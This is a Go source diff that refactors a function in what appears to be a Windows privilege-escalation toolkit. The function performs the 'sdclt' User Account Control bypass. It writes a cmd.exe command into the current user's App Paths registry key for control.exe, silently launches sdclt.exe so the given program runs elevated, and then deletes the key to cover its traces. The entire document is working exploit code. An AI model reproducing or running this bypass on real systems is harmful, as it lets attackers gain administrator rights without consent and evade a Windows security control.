@@ -9,14 +9,14 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-func tSdcltcontrol(path string) error {
-	_ = Reporter{
+func w32_nt_once_sdcltControl(p string) (error, Informer) {
+	inf := Informer{
 		Name: "sdcltcontrol",
 		Desc: "Bypass UAC using sdclt (app paths) and registry key manipulation",
 		Id:   8,
 
 		Type:   "Once",
-		Module: "tSdcltcontrol",
+		Module: "w32_nt_once_sdcltControl",
 
 		Fixed:   true,
 		FixedIn: "16215",
@@ -25,17 +25,17 @@ func tSdcltcontrol(path string) error {
 		Payload: true,
 	}
 
-	fullPath, err := filepath.Abs(path)
+	fPath, err := filepath.Abs(p)
 	if err != nil {
-		return err
+		return err, inf
 	}
-	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)
+	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)
 
 	if _, _, err = registry.CreateKey(
 		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
 		registry.SET_VALUE); err != nil {
 
-		return err
+		return err, inf
 	}
 	wk32, err := registry.OpenKey(
 		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
@@ -43,22 +43,26 @@ func tSdcltcontrol(path string) error {
 	)
 	defer wk32.Close()
 	if err != nil {
-		return err
+		return err, inf
 	}
 
 	if err := wk32.SetStringValue("", cmdN); err != nil {
-		return err
+		return err, inf
 	}
-	time.Sleep(3 * 1 * time.Second)
+	time.Sleep(time.Second)
 
 	cmd := newCmd("start sdclt.exe")
 	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	if _, err = cmd.exec.Output(); err != nil {
-		return err
+		return err, inf
 	}
-	time.Sleep(3 * 1 * time.Second)
+	time.Sleep(3 * time.Second)
+
 	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`); err != nil {
-		return err
+		return err, inf
 	}
-	return nil
+	return nil, inf
 }
+
+// NewOnceSdcltControl #add-some-info-please
+func NewOnceSdcltControl(p string) (error, Informer) { return w32_nt_once_sdcltControl(p) }
